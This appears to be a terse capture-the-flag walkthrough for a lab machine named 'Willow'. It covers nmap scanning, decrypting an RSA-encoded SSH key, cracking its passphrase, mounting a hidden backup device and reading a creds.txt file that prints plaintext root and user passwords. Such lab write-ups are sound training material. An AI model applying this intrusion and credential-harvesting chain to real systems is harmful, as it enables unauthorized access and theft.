# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx willow.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV willow.thm
```

we got these open ports
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP (port 80)
Hey Willow, here's your SSH Private key -- you know where the decryption key is!


we have a decimal suite that is an encoded message with rsa

we found a rsa_keys file
```
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

https://www.cs.drexel.edu/~jpopyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html
we got the password of id_rsa key with ssh2john wildflower


┌──(kali㉿kali)-[~/thm/Willow]
└─$ ssh willow@willow.thm -i id_rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa


willow@willow-tree:~$ mkdir /tmp/test
willow@willow-tree:~$ sudo mount /dev/hidden_backup /tmp/test/
willow@willow-tree:~$ ls -la /tmp/test/
total 6
drwxr-xr-x  2 root root 1024 Jan 30  2020 .
drwxrwxrwt 11 root root 4096 Sep  7 12:48 ..
-rw-r--r--  1 root root   42 Jan 30  2020 creds.txt
willow@willow-tree:~$ cat /tmp/test/creds.txt 
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
willow@willow-tree:~$


Found /home/willow/.cache/tracker/meta.db: SQLite 3.x database                                                                             
Found /home/willow/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database
Found /home/willow/.local/share/zeitgeist/activity.sqlite: SQLite 3.x database
Found /var/lib/apt/listchanges.db: Berkeley DB (Hash, version 9, native byte-order)
Found /var/lib/colord/mapping.db: SQLite 3.x database
Found /var/lib/colord/storage.db: SQLite 3.x database
Found /var/lib/mlocate/mlocate.db: mlocate database, version 0, require visibility, root /
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database


steghide extract -sf user.jpg
we use the root password and we got a root.txt

